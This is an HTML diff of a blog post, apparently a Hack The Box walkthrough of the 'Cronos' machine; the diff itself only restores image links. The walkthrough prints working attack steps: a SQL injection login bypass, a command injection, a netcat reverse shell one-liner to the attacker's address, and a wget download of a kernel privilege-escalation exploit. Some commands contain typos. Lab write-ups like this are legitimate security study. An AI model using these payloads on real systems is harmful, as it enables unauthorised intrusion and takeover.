@@ -211,23 +211,17 @@
       <h1 class="post-title">Cronos -- hack the box</h1>
       <p class="post-meta">@Neal · Mar 15, 2019 · 9 min read</p>
     </header>
-    <article class="post-content"><blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+    <article class="post-content"><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/ad952f5d4c98.png" alt="AEpKkq.png"></p>
 <h2 id="introduction">Introduction</h2>
 <p>Target machine: 10.10.10.13(OS: linux)</p>
 <p>Kali linux: 10.10.16.44</p>
 <h2 id="enumeration">Enumeration</h2>
 <p>Firstly, detect the open ports:</p>
 <pre tabindex="0"><code>nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13
-</code></pre><blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/2b1609a58acc.png" alt="AE1qlF.png"></p>
 <p>3 ports is open, detect the detailed services:</p>
 <pre tabindex="0"><code>namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13
-</code></pre><blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/15fe51ea9188.png" alt="AE1OOJ.png"></p>
 <p>So we can conduct the relation of ports of ports and services as following:</p>
 <table>
 	<thead>
@@ -254,34 +248,24 @@
 <h2 id="exploitation">Exploitation</h2>
 <h3 id="http">http</h3>
 <p>As the target machine provides http service, try to access <code>http://10.10.10.13</code></p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/d432e4592c5c.png" alt="AE3V0A.png"></p>
 <p>Default apache web page, nothing new. So try to brute force <code>http://10.10.10.13/</code> with dirbuster. After brute force for a period time, we have not found anything new.</p>
 <h3 id="dns">DNS</h3>
 <p>As the target machine owns DNS service. It is common to check zone transfer with <code>dig</code>. As we can have a guess of the dns domain of <code>cronos.htb</code>. So zone transfer can be checked by:</p>
 <pre tabindex="0"><code>dig axfr @10.10.10.13 cronos.htb
-</code></pre><blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/826aa2aca8fb.png" alt="AE3ZTI.png"></p>
 <p>An interestring domain name <code>admin.cronos.htb</code> is found. So add an entry into <code>/etc/hosts</code>:</p>
 <pre tabindex="0"><code>10.10.10.13    admin.cronos.htb
 </code></pre><p>Try to access <code>admin.cronos.htb</code> in the browser, a login web page is displayed. Yep, it is what we want. It seems that the login is quite simple. Try to login with sql injection with the username of <code>admin ' or '1' = '1</code>, the password can be anything.</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/ad952f5d4c98.png" alt="AEpKkq.png"></p>
 <p>Magic! We are in. It seems that it is a network tool. However, it seems that it has exposed the ability to execute command remotely. Have a test of <code>8888&amp;whoami</code>:</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/2b1609a58acc.png" alt="AE1qlF.png"></p>
 <p>The result is <code>www-data</code>. Obviously, the command can executed properly. Now try to reverse the shell. Try to listen to port <code>1234</code> by nc in our kali:</p>
 <pre tabindex="0"><code>nc -lvnp 1234
 </code></pre><p>Then use the bash reverse shell command:</p>
 <pre tabindex="0"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.44 1234 &gt;/tmp/f
 </code></pre><p>Wait for server second, shell is return. Wonderful!</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/15fe51ea9188.png" alt="AE1OOJ.png"></p>
 <p>Try to obtain a tty terminal:</p>
 <pre tabindex="0"><code>python -c &#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;
 </code></pre><p>Obviously, the user role can be obtained. Go the <code>home</code> folder and <code>ls</code>， then go into the user folder to get user.txt.</p>
@@ -289,9 +273,7 @@
 <p>It&rsquo;s time to get the root role. See the kernel of the target machine:</p>
 <pre tabindex="0"><code>uname -a
 </code></pre><p>Google linux kernel privilege escalation, find a <a href="https://www.exploit-db.com/exploits/44298">payload</a></p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/d432e4592c5c.png" alt="AE3V0A.png"></p>
 <p>Server a http server to provide the payload, name it as exploit.c:</p>
 <pre tabindex="0"><code>pythoon -m SimpleHTTPServer 80
 </code></pre><p>There are serveal ways to provide http file services, including: php, apache, python, etc. Pyhton is quite convinient. Then download the <code>exploit.c</code> in the target machine:</p>
@@ -304,9 +286,7 @@ wget http://10.10.16.44/exploit
 </code></pre><p>Make sure to have execution perssion by:</p>
 <pre tabindex="0"><code>chmod +x exploit
 </code></pre><p>Just execute it by <code>./exploit</code>. Wow, now see whoami.</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/826aa2aca8fb.png" alt="AE3ZTI.png"></p>
 <h2 id="conclusion">Conclusion</h2>
 <p>The target machine is quite straitforward. The basic point is the zone transfer of DNS exploit. And other steps is not difficult with basic knowledges including: sql injection, reverse shell, etc.</p>
 <h2 id="writeup-方法沉淀授权靶场">Writeup 方法沉淀（授权靶场）</h2>
